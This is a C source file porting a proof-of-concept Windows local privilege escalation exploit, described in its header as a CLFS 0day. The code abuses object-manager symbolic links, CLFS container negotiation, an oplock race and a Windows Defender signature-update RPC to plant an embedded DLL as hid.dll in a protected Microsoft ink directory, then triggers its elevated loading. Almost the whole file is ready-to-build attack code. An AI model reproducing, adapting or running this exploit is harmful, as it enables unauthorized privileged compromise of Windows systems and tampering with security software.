/*
 * sigdrop.c - C port of MSNightmare/SignDrop PoC (SigDrop.cpp)
 *
 * Windows Common Log File System (CLFS) authentication 0day local
 * privilege escalation. Original by MSNightmare (MIT license).
 * This file: plain C translation, buildable with x86_64-w64-mingw32-gcc.
 */
#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0602
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winioctl.h>
#include <objbase.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <ktmw32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resource.h"
#include "windefend_h.h"

/* ------------------------------------------------------------------ */
/* Minimal NT definitions (avoid winternl.h conflicts with mingw)      */
/* ------------------------------------------------------------------ */
typedef LONG NTSTATUS;
typedef struct WDRPCWorkerThreadArgs WDRPCWorkerThreadArgs;
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->ObjectName = (n);                          \
    (p)->Attributes = (a);                          \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

#define OBJ_CASE_INSENSITIVE        0x00000040L
#ifndef STATUS_ACCESS_VIOLATION
#define STATUS_ACCESS_VIOLATION     ((NTSTATUS)0xC0000005L)
#endif
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034L)
#define STATUS_OBJECT_PATH_NOT_FOUND ((NTSTATUS)0xC000003BL)

/* CreateDisposition (NtCreateFile) */
#define FILE_OPEN                   0x00000001
#define FILE_CREATE                 0x00000002
/* CreateOptions */
#define FILE_DIRECTORY_FILE             0x00000001
#define FILE_NON_DIRECTORY_FILE         0x00000040
#define FILE_SYNCHRONOUS_IO_NONALERT    0x00000020
#define FILE_DELETE_ON_CLOSE            0x00001000

typedef NTSTATUS (NTAPI *PFN_NtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef VOID (NTAPI *PFN_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS (NTAPI *PFN_NtCreateSymbolicLinkObject)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PUNICODE_STRING);

static PFN_NtCreateFile             NtCreateFile_;
static PFN_RtlInitUnicodeString    RtlInitUnicodeString_;
static PFN_NtCreateSymbolicLinkObject NtCreateSymbolicLinkObject_;

static int LoadNtdllFuncs(void)
{
    HMODULE hm = GetModuleHandleW(L"ntdll.dll");
    if (!hm)
        return 0;
    NtCreateFile_ = (PFN_NtCreateFile)GetProcAddress(hm, "NtCreateFile");
    RtlInitUnicodeString_ = (PFN_RtlInitUnicodeString)GetProcAddress(hm, "RtlInitUnicodeString");
    NtCreateSymbolicLinkObject_ = (PFN_NtCreateSymbolicLinkObject)GetProcAddress(hm, "NtCreateSymbolicLinkObject");
    return NtCreateFile_ && RtlInitUnicodeString_ && NtCreateSymbolicLinkObject_;
}

struct WDRPCWorkerThreadArgs
{
    HANDLE hntfythread;
    HANDLE hevent;
    RPC_STATUS res;
    wchar_t *dirpath;
};

/* ------------------------------------------------------------------ */
/* Functions required by RPC                                           */
/* ------------------------------------------------------------------ */
void __RPC_FAR *__RPC_USER midl_user_allocate(size_t cBytes)
{
    return (void __RPC_FAR *)malloc(cBytes);
}

void __RPC_USER midl_user_free(void __RPC_FAR *p)
{
    free(p);
}
/* ------------------------------------------------------------------ */
/* Functions required by RPC end                                       */
/* ------------------------------------------------------------------ */

static BOOL GenerateGUID(wchar_t *guid)
{
    GUID g;
    HRESULT hr = CoCreateGuid(&g);
    if (hr)
        return FALSE;
    StringFromGUID2(&g, guid, 40);
    return TRUE;
}

static DWORD WINAPI CallWD(LPVOID param)
{
    WDRPCWorkerThreadArgs *args = (WDRPCWorkerThreadArgs *)param;
    RPC_WSTR MS_WD_UUID = (RPC_WSTR)L"c503f532-443a-4c69-8300-ccd1fbdb3839";
    RPC_WSTR StringBinding = NULL;
    if (RpcStringBindingComposeW(MS_WD_UUID, (RPC_WSTR)L"ncalrpc", NULL,
            (RPC_WSTR)L"IMpService77BDAF73-B396-481F-9042-AD358843EC24",
            NULL, &StringBinding) != RPC_S_OK)
    {
        printf("Unexpected error while building an RPC binding from string !!!");
        ExitProcess(1);
        return 0;
    }
    RPC_BINDING_HANDLE bindhandle = 0;
    if (RpcBindingFromStringBindingW(StringBinding, &bindhandle) != RPC_S_OK)
    {
        printf("Failed to connect to windows defender RPC port !!!");
        ExitProcess(1);
        return 0;
    }
    error_status_t errstat = 0;
    RPC_STATUS stat = Proc42_ServerMpUpdateEngineSignature(bindhandle, 0, args->dirpath, &errstat);
    args->res = stat;
    if (args->hevent)
        SetEvent(args->hevent);
    return 0;
}

struct NegotiateCtx
{
    ULONGLONG cbContainer;
    USHORT cContainer;
};

static BOOL Negotiate(HANDLE hLogFile, PULONGLONG cbContainer, const wchar_t *path)
{
    size_t len = wcslen(path);
    DWORD sz = (DWORD)(sizeof(struct NegotiateCtx) + 2 * (len + 1));
    UCHAR *ptr = (UCHAR *)malloc(sz);
    if (!ptr)
        return FALSE;
    struct NegotiateCtx *ctx = (struct NegotiateCtx *)ptr;
    ctx->cbContainer = *cbContainer;
    ctx->cContainer = 1;
    wcscpy((wchar_t *)(ptr + sizeof(struct NegotiateCtx)), path);
    DWORD bytesReturned;
    BOOL ok = DeviceIoControl(hLogFile, 0x8007A808, ctx, sz, cbContainer,
        sizeof(ULONGLONG), &bytesReturned, NULL);
    free(ptr);
    return ok;
}

static void TerminateOskProcess(void)
{
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return;

    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            if (_wcsicmp(entry.szExeFile, L"osk.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (hProcess)
                {
                    TerminateProcess(hProcess, ERROR_SUCCESS);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

int main(void)
{
    if (!LoadNtdllFuncs())
    {
        printf("Failed to resolve ntdll functions !!!\n");
        return 1;
    }

    TerminateOskProcess();
    ShellExecuteW(NULL, L"open", L"osk.exe", NULL, NULL, SW_HIDE);
    Sleep(100);

    wchar_t rguid[64] = { 0 };
    wchar_t rguid2[64] = { 0 };
    wchar_t rguid3[64] = { 0 };
    if (!GenerateGUID(rguid) || !GenerateGUID(rguid2) || !GenerateGUID(rguid3))
    {
        printf("Failed to generate GUID !!!\n");
        return 1;
    }

    FILE_DISPOSITION_INFO fdi;
    ZeroMemory(&fdi, sizeof(fdi));
    fdi.DeleteFile = TRUE;

    wchar_t workdir[MAX_PATH] = { 0 };
    ExpandEnvironmentStringsW(L"\\??\\%TEMP%\\SigDrop_", workdir, MAX_PATH);
    GenerateGUID(&workdir[wcslen(workdir)]);

    UNICODE_STRING _workdir;
    RtlInitUnicodeString_(&_workdir, workdir);
    OBJECT_ATTRIBUTES objattr;
    InitializeObjectAttributes(&objattr, &_workdir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat;
    ZeroMemory(&iostat, sizeof(iostat));
    HANDLE hworkdir = NULL;
    NTSTATUS stat = NtCreateFile_(&hworkdir, GENERIC_READ | SYNCHRONIZE | DELETE,
        &objattr, &iostat, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_CREATE, FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
        NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create work directory : %ls error : 0x%.8X\n", workdir, (unsigned int)stat);
        return 1;
    }

    wchar_t clfslog[MAX_PATH] = { 0 };
    swprintf(clfslog, MAX_PATH, L"\\CLFS%ls\\%ls", workdir, rguid);
    UNICODE_STRING _clfslog;
    RtlInitUnicodeString_(&_clfslog, clfslog);
    OBJECT_ATTRIBUTES objattr2;
    InitializeObjectAttributes(&objattr2, &_clfslog, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hclfslog = NULL;
    stat = NtCreateFile_(&hclfslog, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE | DELETE,
        &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create clfs log file, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }

    wchar_t newcontainerpath[MAX_PATH] = L"\\BaseNamedObjects\\Restricted\\";
    wcscat(newcontainerpath, rguid);
    wchar_t newcontainerpathsig[MAX_PATH];
    wcscpy(newcontainerpathsig, newcontainerpath);
    wcscat(newcontainerpathsig, L".cnpf");
    wchar_t smtarget[MAX_PATH] = { 0 };
    wchar_t smtargetsig[MAX_PATH] = { 0 };
    swprintf(smtarget, MAX_PATH, L"%ls\\%ls", workdir, rguid2);
    wcscpy(smtargetsig, smtarget);
    wcscat(smtargetsig, L".cnpf");

    UNICODE_STRING ncontainerpath;
    UNICODE_STRING ncontainerpathsig;
    RtlInitUnicodeString_(&ncontainerpath, newcontainerpath);
    RtlInitUnicodeString_(&ncontainerpathsig, newcontainerpathsig);
    UNICODE_STRING ncontainertarget;
    UNICODE_STRING ncontainertargetsig;
    RtlInitUnicodeString_(&ncontainertarget, smtarget);
    RtlInitUnicodeString_(&ncontainertargetsig, smtargetsig);
    OBJECT_ATTRIBUTES ncontainerobjattr;
    OBJECT_ATTRIBUTES ncontainersigobjattr;
    InitializeObjectAttributes(&ncontainerobjattr, &ncontainerpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&ncontainersigobjattr, &ncontainerpathsig, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hsm1 = NULL;
    HANDLE hsm2 = NULL;
    stat = NtCreateSymbolicLinkObject_(&hsm1, GENERIC_ALL, &ncontainerobjattr, &ncontainertarget);
    NTSTATUS stat2 = NtCreateSymbolicLinkObject_(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
    if (!NT_SUCCESS(stat) || !NT_SUCCESS(stat2))
    {
        printf("Failed to create object manager symbolic links, error : 0x%.8X | 0x%.8X\n",
            (unsigned int)stat, (unsigned int)stat2);
        SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclfslog);
        return 1;
    }

    ULONGLONG cbsz = 512;
    if (!Negotiate(hclfslog, &cbsz, newcontainerpath))
    {
        printf("Failed to create CLFS containers, error : %d\n", (int)GetLastError());
        SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclfslog);
        return 1;
    }

    HANDLE htest = NULL;
    ZeroMemory(&iostat, sizeof(iostat));
    stat = NtCreateFile_(&htest, SYNCHRONIZE | FILE_READ_ATTRIBUTES, &ncontainersigobjattr,
        &iostat, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_OPEN, FILE_NON_DIRECTORY_FILE, NULL, 0);
    if (stat == STATUS_OBJECT_NAME_NOT_FOUND || stat == STATUS_OBJECT_PATH_NOT_FOUND)
    {
        printf("This machine is not vulnerable.\n");
        SetFileInformationByHandle(hclfslog, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hclfslog);
        return 0;
    }
    CloseHandle(hclfslog);

    HANDLE hlock = NULL;
    UNICODE_STRING mpengstr;
    RtlInitUnicodeString_(&mpengstr, L"MpEngine.dll");
    OBJECT_ATTRIBUTES mpengobjattr;
    InitializeObjectAttributes(&mpengobjattr, &mpengstr, OBJ_CASE_INSENSITIVE, hworkdir, NULL);
    ZeroMemory(&iostat, sizeof(iostat));
    stat = NtCreateFile_(&hlock, GENERIC_WRITE | DELETE | SYNCHRONIZE, &mpengobjattr,
        &iostat, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_CREATE, 0, NULL, 0);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create bait file, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }

    OVERLAPPED ovd;
    ZeroMemory(&ovd, sizeof(ovd));
    REQUEST_OPLOCK_INPUT_BUFFER opin;
    ZeroMemory(&opin, sizeof(opin));
    opin.StructureLength = sizeof(opin);
    opin.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    opin.RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE | OPLOCK_LEVEL_CACHE_WRITE;
    opin.Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST;
    REQUEST_OPLOCK_OUTPUT_BUFFER opout;
    ZeroMemory(&opout, sizeof(opout));
    opout.StructureLength = sizeof(opout);
    opout.StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION;
    DWORD cb = 0;
    ovd.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!DeviceIoControl(hlock, FSCTL_REQUEST_OPLOCK, &opin, sizeof(opin), &opout,
            sizeof(opout), &cb, &ovd))
    {
        if (GetLastError() != ERROR_IO_PENDING)
        {
            printf("Failed to create oplock, error : %d\n", (int)GetLastError());
            return 1;
        }
    }

    HANDLE hupdsm = NULL;
    wchar_t lnkpath[MAX_PATH] = L"\\BaseNamedObjects\\Restricted\\";
    wcscat(lnkpath, rguid3);
    UNICODE_STRING updir;
    RtlInitUnicodeString_(&updir, lnkpath);
    OBJECT_ATTRIBUTES objattrupd;
    InitializeObjectAttributes(&objattrupd, &updir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    UNICODE_STRING updirtarget;
    RtlInitUnicodeString_(&updirtarget, workdir);
    stat = NtCreateSymbolicLinkObject_(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create update directory symbolic link, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }

    char buff[0x1000];
    DWORD ret = 0;
    wchar_t inkdir[] = L"C:\\Program Files\\Common Files\\microsoft shared\\ink";
    HANDLE hmonitor = CreateFileW(inkdir, GENERIC_READ | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED, NULL);
    if (!hmonitor || hmonitor == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open %ls directory, error : %d\n", inkdir, (int)GetLastError());
        return 1;
    }
    OVERLAPPED ov2;
    ZeroMemory(&ov2, sizeof(ov2));
    ov2.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!ov2.hEvent)
    {
        printf("Failed to create event for monitoring, error : %d\n", (int)GetLastError());
        return 1;
    }
    ZeroMemory(buff, sizeof(buff));
    ret = 0;
    if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE,
            FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
    {
        printf("Failed to create directory watch, error : %d\n", (int)GetLastError());
        return 1;
    }

    WDRPCWorkerThreadArgs wdargs;
    ZeroMemory(&wdargs, sizeof(wdargs));
    wchar_t dipath[MAX_PATH] = L"\\\\.\\GlobalRoot\\BaseNamedObjects\\Restricted\\";
    wcscat(dipath, rguid3);
    wdargs.dirpath = dipath;
    wdargs.hntfythread = OpenThread(THREAD_ALL_ACCESS, FALSE, GetCurrentThreadId());
    wdargs.hevent = CreateEventW(NULL, FALSE, FALSE, NULL);
    DWORD tid = 0;
    HANDLE hthread = CreateThread(NULL, 0, CallWD, &wdargs, 0, &tid);
    if (!hthread)
    {
        printf("Unexpected failure creating worker thread, error : %d\n", (int)GetLastError());
        return 1;
    }

    WaitForSingleObject(ovd.hEvent, INFINITE);
    SetFileInformationByHandle(hlock, FileDispositionInfo, &fdi, sizeof(fdi));
    CloseHandle(hupdsm);
    RtlInitUnicodeString_(&updirtarget, L"\\BaseNamedObjects\\Restricted");
    stat = NtCreateSymbolicLinkObject_(&hupdsm, GENERIC_ALL, &objattrupd, &updirtarget);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create update directory symbolic link, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }
    UNICODE_STRING rclfssrc;
    RtlInitUnicodeString_(&rclfssrc, L"\\BaseNamedObjects\\Restricted\\mpasbase.vdm");
    OBJECT_ATTRIBUTES rclfsobjattr;
    InitializeObjectAttributes(&rclfsobjattr, &rclfssrc, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hlastsm = NULL;
    stat = NtCreateSymbolicLinkObject_(&hlastsm, GENERIC_ALL, &rclfsobjattr, &_clfslog);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create symbolic link object, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }
    CloseHandle(hsm2);
    RtlInitUnicodeString_(&ncontainertargetsig, L"\\??\\C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll");
    stat = NtCreateSymbolicLinkObject_(&hsm2, GENERIC_ALL, &ncontainersigobjattr, &ncontainertargetsig);
    if (!NT_SUCCESS(stat))
    {
        printf("Failed to create symbolic link object, error : 0x%.8X\n", (unsigned int)stat);
        return 1;
    }
    CloseHandle(hlock);

    if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
    {
        printf("exploit failed.\n");
        return 1;
    }
    else
    {
        goto enter_loop;
    }
    do
    {
        ResetEvent(ov2.hEvent);
        ZeroMemory(buff, sizeof(buff));
        ret = 0;
        if (!ReadDirectoryChangesW(hmonitor, buff, sizeof(buff), FALSE,
                FILE_NOTIFY_CHANGE_FILE_NAME, &ret, &ov2, NULL))
        {
            printf("Failed to create directory watch, error : %d\n", (int)GetLastError());
            return 1;
        }
    enter_loop:
    {
        FILE_NOTIFY_INFORMATION *fni = (FILE_NOTIFY_INFORMATION *)buff;
        if (fni->Action == FILE_ACTION_ADDED)
        {
            if (_wcsicmp(fni->FileName, L"hid.dll") == 0)
            {
                break;
            }
        }
        if (WaitForSingleObject(ov2.hEvent, 5000) == WAIT_TIMEOUT)
        {
            printf("exploit failed.\n");
            return 1;
        }
    }
    } while (1);

    HANDLE htrans = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
    if (!htrans || htrans == INVALID_HANDLE_VALUE)
    {
        printf("Failed to create transaction, error : %d\n", (int)GetLastError());
        return 1;
    }

    HANDLE hbin = NULL;
    do
    {
        Sleep(100);
        hbin = CreateFileW(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll",
            GENERIC_READ | GENERIC_EXECUTE | GENERIC_WRITE | MAXIMUM_ALLOWED,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    } while (!hbin || hbin == INVALID_HANDLE_VALUE);

    HRSRC hResInfo_dll = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_DLL1), L"dll");
    HGLOBAL hResData_dll = LoadResource(NULL, hResInfo_dll);
    LPVOID pResourceData_dll = LockResource(hResData_dll);
    DWORD dwSize_dll = SizeofResource(NULL, hResInfo_dll);
    LARGE_INTEGER fsz;
    ZeroMemory(&fsz, sizeof(fsz));
    fsz.QuadPart = (LONGLONG)dwSize_dll;
    HANDLE hmapping = CreateFileMappingW(hbin, NULL, PAGE_READWRITE, fsz.HighPart, fsz.LowPart, NULL);
    if (!hmapping || hmapping == INVALID_HANDLE_VALUE)
    {
        printf("Failed to map target file to memory, error : %d\n", (int)GetLastError());
        SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hbin);
        return 1;
    }
    void *filebuff = MapViewOfFile(hmapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (!filebuff)
    {
        CloseHandle(hmapping);
        SetFileInformationByHandle(hbin, FileDispositionInfo, &fdi, sizeof(fdi));
        CloseHandle(hbin);
        printf("Failed to map target file to memory, error : %d\n", (int)GetLastError());
        return 1;
    }
    memmove(filebuff, pResourceData_dll, dwSize_dll);
    UnmapViewOfFile(filebuff);
    CloseHandle(hmapping);
    FlushFileBuffers(hbin);
    CloseHandle(hbin);
    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\conhost.exe", NULL, NULL, SW_SHOW);
    Sleep(2000);
    TerminateOskProcess();
    DeleteFileTransactedW(L"C:\\Program Files\\Common Files\\microsoft shared\\ink\\hid.dll", htrans);
    CommitTransaction(htrans);
    CloseHandle(htrans);
    return 0;
}
